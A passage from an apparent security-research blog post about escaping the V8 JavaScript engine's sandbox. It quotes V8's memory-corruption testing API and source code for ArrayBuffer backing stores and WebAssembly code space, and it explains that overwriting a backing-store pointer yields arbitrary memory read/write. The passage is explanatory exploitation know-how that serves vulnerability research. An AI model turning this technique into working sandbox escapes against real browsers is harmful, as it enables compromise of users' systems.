class="line"><span class="deletion">-</span></span><br><span class="line"> namespace internal &#123;</span><br><span class="line"> </span><br><span class="line"> #ifdef V8_SANDBOX_IS_AVAILABLE</span><br><span class="line"><span class="comment">diff --git a/src/sandbox/testing.cc b/src/sandbox/testing.cc</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 00000000000..753343d9550</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/src/sandbox/testing.cc</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,194 @@</span></span><br><span class="line"><span class="addition">+// Copyright 2022 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="addition">+// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="addition">+// found in the LICENSE file.</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#include &quot;src/sandbox/testing.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#include &quot;src/api/api-inl.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/api/api-natives.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/common/globals.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/execution/isolate-inl.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/heap/factory.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/objects/backing-store.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/objects/js-objects.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/objects/templates.h&quot;</span></span><br><span class="line"><span class="addition">+#include &quot;src/sandbox/sandbox.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+namespace v8 &#123;</span></span><br><span class="line"><span class="addition">+namespace internal &#123;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#ifdef V8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+namespace &#123;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// Sandbox.byteLength</span></span><br><span class="line"><span class="addition">+void SandboxGetByteLength(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args) &#123;</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = args.GetIsolate();</span></span><br><span class="line"><span class="addition">+  double sandbox_size = GetProcessWideSandbox()-&gt;size();</span></span><br><span class="line"><span class="addition">+  args.GetReturnValue().Set(v8::Number::New(isolate, sandbox_size));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// new Sandbox.MemoryView(args) -&gt; Sandbox.MemoryView</span></span><br><span class="line"><span class="addition">+void SandboxMemoryView(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args) &#123;</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = args.GetIsolate();</span></span><br><span class="line"><span class="addition">+  Local&lt;v8::Context&gt; context = isolate-&gt;GetCurrentContext();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (!args.IsConstructCall()) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;Sandbox.MemoryView must be invoked with &#x27;new&#x27;&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Local&lt;v8::Integer&gt; arg1, arg2;</span></span><br><span class="line"><span class="addition">+  if (!args[0]-&gt;ToInteger(context).ToLocal(&amp;arg1) ||</span></span><br><span class="line"><span class="addition">+      !args[1]-&gt;ToInteger(context).ToLocal(&amp;arg2)) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;Expects two number arguments (start offset and size)&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Sandbox* sandbox = GetProcessWideSandbox();</span></span><br><span class="line"><span class="addition">+  CHECK_LE(sandbox-&gt;size(), kMaxSafeIntegerUint64);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  uint64_t offset = arg1-&gt;Value();</span></span><br><span class="line"><span class="addition">+  uint64_t size = arg2-&gt;Value();</span></span><br><span class="line"><span class="addition">+  if (offset &gt; sandbox-&gt;size() || size &gt; sandbox-&gt;size() ||</span></span><br><span class="line"><span class="addition">+      (offset + size) &gt; sandbox-&gt;size()) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(</span></span><br><span class="line"><span class="addition">+        &quot;The MemoryView must be entirely contained within the sandbox&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Factory* factory = reinterpret_cast&lt;Isolate*&gt;(isolate)-&gt;factory();</span></span><br><span class="line"><span class="addition">+  std::unique_ptr&lt;BackingStore&gt; memory = BackingStore::WrapAllocation(</span></span><br><span class="line"><span class="addition">+      reinterpret_cast&lt;void*&gt;(sandbox-&gt;base() + offset), size,</span></span><br><span class="line"><span class="addition">+      v8::BackingStore::EmptyDeleter, nullptr, SharedFlag::kNotShared);</span></span><br><span class="line"><span class="addition">+  if (!memory) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;Out of memory: MemoryView backing store&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSArrayBuffer&gt; buffer = factory-&gt;NewJSArrayBuffer(std::move(memory));</span></span><br><span class="line"><span class="addition">+  args.GetReturnValue().Set(Utils::ToLocal(buffer));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// Sandbox.getAddressOf(object) -&gt; Number</span></span><br><span class="line"><span class="addition">+void SandboxGetAddressOf(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args) &#123;</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = args.GetIsolate();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (args.Length() == 0) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;First argument must be provided&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; arg = Utils::OpenHandle(*args[0]);</span></span><br><span class="line"><span class="addition">+  if (!arg-&gt;IsHeapObject()) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;First argument must be a HeapObject&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  // HeapObjects must be allocated inside the pointer compression cage so their</span></span><br><span class="line"><span class="addition">+  // address relative to the start of the sandbox can be obtained simply by</span></span><br><span class="line"><span class="addition">+  // taking the lowest 32 bits of the absolute address.</span></span><br><span class="line"><span class="addition">+  uint32_t address = static_cast&lt;uint32_t&gt;(HeapObject::cast(*arg).address());</span></span><br><span class="line"><span class="addition">+  args.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// Sandbox.getSizeOf(object) -&gt; Number</span></span><br><span class="line"><span class="addition">+void SandboxGetSizeOf(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args) &#123;</span></span><br><span class="line"><span class="addition">+  v8::Isolate* isolate = args.GetIsolate();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  if (args.Length() == 0) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;First argument must be provided&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; arg = Utils::OpenHandle(*args[0]);</span></span><br><span class="line"><span class="addition">+  if (!arg-&gt;IsHeapObject()) &#123;</span></span><br><span class="line"><span class="addition">+    isolate-&gt;ThrowError(&quot;First argument must be a HeapObject&quot;);</span></span><br><span class="line"><span class="addition">+    return;</span></span><br><span class="line"><span class="addition">+  &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  int size = HeapObject::cast(*arg).Size();</span></span><br><span class="line"><span class="addition">+  args.GetReturnValue().Set(v8::Integer::New(isolate, size));</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+Handle&lt;FunctionTemplateInfo&gt; NewFunctionTemplate(</span></span><br><span class="line"><span class="addition">+    Isolate* isolate, FunctionCallback func,</span></span><br><span class="line"><span class="addition">+    ConstructorBehavior constructor_behavior) &#123;</span></span><br><span class="line"><span class="addition">+  // Use the API functions here as they are more convenient to use.</span></span><br><span class="line"><span class="addition">+  v8::Isolate* api_isolate = reinterpret_cast&lt;v8::Isolate*&gt;(isolate);</span></span><br><span class="line"><span class="addition">+  Local&lt;FunctionTemplate&gt; function_template =</span></span><br><span class="line"><span class="addition">+      FunctionTemplate::New(api_isolate, func, &#123;&#125;, &#123;&#125;, 0, constructor_behavior,</span></span><br><span class="line"><span class="addition">+                            SideEffectType::kHasSideEffect);</span></span><br><span class="line"><span class="addition">+  return v8::Utils::OpenHandle(*function_template);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+Handle&lt;JSFunction&gt; CreateFunc(Isolate* isolate, FunctionCallback func,</span></span><br><span class="line"><span class="addition">+                              Handle&lt;String&gt; name, bool is_constructor) &#123;</span></span><br><span class="line"><span class="addition">+  ConstructorBehavior constructor_behavior = is_constructor</span></span><br><span class="line"><span class="addition">+                                                 ? ConstructorBehavior::kAllow</span></span><br><span class="line"><span class="addition">+                                                 : ConstructorBehavior::kThrow;</span></span><br><span class="line"><span class="addition">+  Handle&lt;FunctionTemplateInfo&gt; function_template =</span></span><br><span class="line"><span class="addition">+      NewFunctionTemplate(isolate, func, constructor_behavior);</span></span><br><span class="line"><span class="addition">+  return ApiNatives::InstantiateFunction(function_template, name)</span></span><br><span class="line"><span class="addition">+      .ToHandleChecked();</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+void InstallFunc(Isolate* isolate, Handle&lt;JSObject&gt; holder,</span></span><br><span class="line"><span class="addition">+                 FunctionCallback func, const char* name, int num_parameters,</span></span><br><span class="line"><span class="addition">+                 bool is_constructor) &#123;</span></span><br><span class="line"><span class="addition">+  Factory* factory = isolate-&gt;factory();</span></span><br><span class="line"><span class="addition">+  Handle&lt;String&gt; function_name = factory-&gt;NewStringFromAsciiChecked(name);</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSFunction&gt; function =</span></span><br><span class="line"><span class="addition">+      CreateFunc(isolate, func, function_name, is_constructor);</span></span><br><span class="line"><span class="addition">+  function-&gt;shared().set_length(num_parameters);</span></span><br><span class="line"><span class="addition">+  JSObject::AddProperty(isolate, holder, function_name, function, NONE);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+void InstallGetter(Isolate* isolate, Handle&lt;JSObject&gt; object,</span></span><br><span class="line"><span class="addition">+                   FunctionCallback func, const char* name) &#123;</span></span><br><span class="line"><span class="addition">+  Factory* factory = isolate-&gt;factory();</span></span><br><span class="line"><span class="addition">+  Handle&lt;String&gt; property_name = factory-&gt;NewStringFromAsciiChecked(name);</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSFunction&gt; getter = CreateFunc(isolate, func, property_name, false);</span></span><br><span class="line"><span class="addition">+  Handle&lt;Object&gt; setter = factory-&gt;null_value();</span></span><br><span class="line"><span class="addition">+  JSObject::DefineAccessor(object, property_name, getter, setter, FROZEN);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+void InstallFunction(Isolate* isolate, Handle&lt;JSObject&gt; holder,</span></span><br><span class="line"><span class="addition">+                     FunctionCallback func, const char* name,</span></span><br><span class="line"><span class="addition">+                     int num_parameters) &#123;</span></span><br><span class="line"><span class="addition">+  InstallFunc(isolate, holder, func, name, num_parameters, false);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+void InstallConstructor(Isolate* isolate, Handle&lt;JSObject&gt; holder,</span></span><br><span class="line"><span class="addition">+                        FunctionCallback func, const char* name,</span></span><br><span class="line"><span class="addition">+                        int num_parameters) &#123;</span></span><br><span class="line"><span class="addition">+  InstallFunc(isolate, holder, func, name, num_parameters, true);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+&#125;  // namespace</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+// static</span></span><br><span class="line"><span class="addition">+void MemoryCorruptionApi::Install(Isolate* isolate) &#123;</span></span><br><span class="line"><span class="addition">+  CHECK(GetProcessWideSandbox()-&gt;is_initialized());</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  Factory* factory = isolate-&gt;factory();</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  // Create the special Sandbox object that provides read/write access to the</span></span><br><span class="line"><span class="addition">+  // sandbox address space alongside other miscellaneous functionality.</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSObject&gt; sandbox =</span></span><br><span class="line"><span class="addition">+      factory-&gt;NewJSObject(isolate-&gt;object_function(), AllocationType::kOld);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  InstallGetter(isolate, sandbox, SandboxGetByteLength, &quot;byteLength&quot;);</span></span><br><span class="line"><span class="addition">+  InstallConstructor(isolate, sandbox, SandboxMemoryView, &quot;MemoryView&quot;, 2);</span></span><br><span class="line"><span class="addition">+  InstallFunction(isolate, sandbox, SandboxGetAddressOf, &quot;getAddressOf&quot;, 1);</span></span><br><span class="line"><span class="addition">+  InstallFunction(isolate, sandbox, SandboxGetSizeOf, &quot;getSizeOf&quot;, 1);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+  // Install the Sandbox object as property on the global object.</span></span><br><span class="line"><span class="addition">+  Handle&lt;JSGlobalObject&gt; global = isolate-&gt;global_object();</span></span><br><span class="line"><span class="addition">+  Handle&lt;String&gt; name = factory-&gt;NewStringFromAsciiChecked(&quot;Sandbox&quot;);</span></span><br><span class="line"><span class="addition">+  JSObject::AddProperty(isolate, global, name, sandbox, DONT_ENUM);</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#endif  // V8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+&#125;  // namespace internal</span></span><br><span class="line"><span class="addition">+&#125;  // namespace v8</span></span><br><span class="line"><span class="comment">diff --git a/src/sandbox/testing.h b/src/sandbox/testing.h</span></span><br><span class="line">new file mode 100644</span><br><span class="line"><span class="comment">index 00000000000..4ab7637702d</span></span><br><span class="line"><span class="comment">--- /dev/null</span></span><br><span class="line"><span class="comment">+++ b/src/sandbox/testing.h</span></span><br><span class="line"><span class="meta">@@ -0,0 +1,28 @@</span></span><br><span class="line"><span class="addition">+// Copyright 2022 the V8 project authors. All rights reserved.</span></span><br><span class="line"><span class="addition">+// Use of this source code is governed by a BSD-style license that can be</span></span><br><span class="line"><span class="addition">+// found in the LICENSE file.</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#ifndef V8_SANDBOX_TESTING_H_</span></span><br><span class="line"><span class="addition">+#define V8_SANDBOX_TESTING_H_</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#include &quot;src/common/globals.h&quot;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+namespace v8 &#123;</span></span><br><span class="line"><span class="addition">+namespace internal &#123;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#ifdef V8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+// A JavaScript API that emulates typical exploit primitives.</span></span><br><span class="line"><span class="addition">+//</span></span><br><span class="line"><span class="addition">+// This can be used for testing the sandbox, for example to write regression</span></span><br><span class="line"><span class="addition">+// tests for bugs in the sandbox or to develop fuzzers.</span></span><br><span class="line"><span class="addition">+class MemoryCorruptionApi &#123;</span></span><br><span class="line"><span class="addition">+ public:</span></span><br><span class="line"><span class="addition">+  V8_EXPORT_PRIVATE static void Install(Isolate* isolate);</span></span><br><span class="line"><span class="addition">+&#125;;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#endif  // V8_EXPOSE_MEMORY_CORRUPTION_API</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+&#125;  // namespace internal</span></span><br><span class="line"><span class="addition">+&#125;  // namespace v8</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+#endif  // V8_SANDBOX_TESTING_H_</span></span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Backing-store-of-ArrayBuffer"><a href="#Backing-store-of-ArrayBuffer" class="headerlink" title="Backing store of ArrayBuffer"></a>Backing store of ArrayBuffer</h3><p>The <a href="https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer"><code>ArrayBuffer</code></a> object in JavaScript is managed by <code>JSArrayBuffer</code> class.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/objects/js-array-buffer.tq:14-24 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">class</span> <span class="title class_">JSArrayBuffer</span> extends JSObject &#123;</span><br><span class="line">  byte_length: uintptr;</span><br><span class="line">  max_byte_length: uintptr;</span><br><span class="line">  <span class="comment">// A SandboxedPtr if the sandbox is enabled</span></span><br><span class="line">  backing_store: RawPtr;</span><br><span class="line">  extension: RawPtr;</span><br><span class="line">  bit_field: JSArrayBufferFlags;</span><br><span class="line">  <span class="comment">// Pads header size to be a multiple of kTaggedSize.</span></span><br><span class="line">  @<span class="keyword">if</span>(TAGGED_SIZE_8_BYTES) optional_padding: uint32;</span><br><span class="line">  @ifnot(TAGGED_SIZE_8_BYTES) optional_padding: <span class="type">void</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>JSArrayBuffer</code> has a pointer named <code>backing_store</code> pointing to the memory containing the actual value stored in the <code>ArrayBuffer</code>.</p><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/1.png"></p><p>We have to use <a href="https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/TypedArray"><code>TypedArray</code></a> or <a href="https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/DataView"><code>DataView</code></a> to access the values stored in an <code>ArrayBuffer</code>. For example, we can store an 8-byte value with <a href="https://developer.mozilla.org/docs/Web/JavaScript/Reference/Global_Objects/DataView/setBigUint64"><code>DataView.prototype.setBigUint64()</code></a>, which is managed by <code>DataViewPrototypeSetBigUint64()</code>.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/builtins/data-view.tq:869-877 */</span></span><br><span class="line"></span><br><span class="line"><span class="function">transitioning javascript builtin <span class="title">DataViewPrototypeSetBigUint64</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    js-implicit context: NativeContext, receiver: JSAny)</span><span class="params">(...arguments)</span>: JSAny &#123;</span></span><br><span class="line">  <span class="type">const</span> offset: JSAny = arguments[<span class="number">0</span>];</span><br><span class="line">  <span class="type">const</span> value: JSAny = arguments[<span class="number">1</span>];</span><br><span class="line">  <span class="type">const</span> isLittleEndian: JSAny = arguments[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">DataViewSet</span>(</span><br><span class="line">      context, receiver, offset, value, isLittleEndian,</span><br><span class="line">      ElementsKind::BIGUINT64_ELEMENTS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>DataViewPrototypeSetBigUint64()</code> gets into <a href="https://source.chromium.org/chromium/v8/v8/+/0ac7e1203fcb957851887fb140dc8a41139846a5:src/builtins/data-view.tq;l=874"><code>DataViewSet()</code></a> → <a href="https://source.chromium.org/chromium/v8/v8/+/0ac7e1203fcb957851887fb140dc8a41139846a5:src/builtins/data-view.tq;l=752"><code>StoreDataViewBigInt()</code></a> → <a href="https://source.chromium.org/chromium/v8/v8/+/0ac7e1203fcb957851887fb140dc8a41139846a5:src/builtins/data-view.tq;l=668"><code>StoreDataView64()</code></a>.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/builtins/data-view.tq:590-624 */</span></span><br><span class="line"></span><br><span class="line"><span class="function">macro <span class="title">StoreDataView64</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    buffer: JSArrayBuffer, offset: uintptr, lowWord: uint32, highWord: uint32,</span></span></span><br><span class="line"><span class="params"><span class="function">    requestedLittleEndian: <span class="type">bool</span>)</span>: void &#123;</span></span><br><span class="line">  <span class="type">const</span> dataPointer: RawPtr = buffer.backing_store_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> b0: uint32 = lowWord &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">const</span> b1: uint32 = (lowWord &gt;&gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">const</span> b2: uint32 = (lowWord &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">const</span> b3: uint32 = lowWord &gt;&gt;&gt; <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> b4: uint32 = highWord &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">const</span> b5: uint32 = (highWord &gt;&gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">const</span> b6: uint32 = (highWord &gt;&gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">  <span class="type">const</span> b7: uint32 = highWord &gt;&gt;&gt; <span class="number">24</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (requestedLittleEndian) &#123;</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset, b0);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">1</span>, b1);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">2</span>, b2);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">3</span>, b3);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">4</span>, b4);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">5</span>, b5);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">6</span>, b6);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">7</span>, b7);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset, b7);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">1</span>, b6);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">2</span>, b5);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">3</span>, b4);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">4</span>, b3);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">5</span>, b2);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">6</span>, b1);</span><br><span class="line">    <span class="built_in">StoreWord8</span>(dataPointer, offset + <span class="number">7</span>, b0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>StoreDataView64()</code> stores the value in the backing store one byte at a time.</p><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/2.png"></p><p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/3.png"></p><p>If we can overwrite the backing store pointer of <code>ArrayBuffer</code> with an arbitrary address, we can access that address to read from or write to.</p><h3 id="Execution-flow-of-WebAssembly-function"><a href="#Execution-flow-of-WebAssembly-function" class="headerlink" title="Execution flow of WebAssembly function"></a>Execution flow of WebAssembly function</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* src/wasm/wasm-code-manager.cc:2156-2222 */</span></span><br><span class="line"></span><br><span class="line"><span class="function">std::shared_ptr&lt;NativeModule&gt; <span class="title">WasmCodeManager::NewNativeModule</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    Isolate* isolate, <span class="type">const</span> WasmFeatures&amp; enabled, <span class="type">size_t</span> code_size_estimate,</span></span></span><br><span class="line"><span class="params"><span class="function">    std::shared_ptr&lt;<span class="type">const</span> WasmModule&gt; <span class="keyword">module</span>)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">  <span class="comment">// Try up to two times; getting rid of dead JSArrayBuffer allocations might</span></span><br><span class="line">  <span class="comment">// require two GCs because the first GC maybe incremental and may have</span></span><br><span class="line">  <span class="comment">// floating garbage.</span></span><br><span class="line">  <span class="type">static</span> <span class="keyword">constexpr</span> <span class="type">int</span> kAllocationRetries = <span class="number">2</span>;</span><br><span class="line">  VirtualMemory code_space;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> retries = <span class="number">0</span>;; ++retries) &#123;</span><br><span class="line">    code_space = <span class="built_in">TryAllocate</span>(code_vmem_size);</span><br><span class="line">    <span class="keyword">if</span> (code_space.<span class="built_in">IsReserved</span>()) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (retries == kAllocationRetries) &#123;</span><br><span class="line">      V8::<span class="built_in">FatalProcessOutOfMemory</span>(isolate, <span class="string">&quot;NewNativeModule&quot;</span>);</span><br><span class="line">      <span class="built_in">UNREACHABLE</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Run one GC, then try the allocation again.</span></span><br><span class="line">    isolate-&gt;<span class="built_in">heap</span>()-&gt;<span class="built_in">MemoryPressureNotification</span>(MemoryPressureLevel::kCritical,</span><br><span class="line">                                                <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When a WebAssembly module is constructed, <code>code_space</code> for the 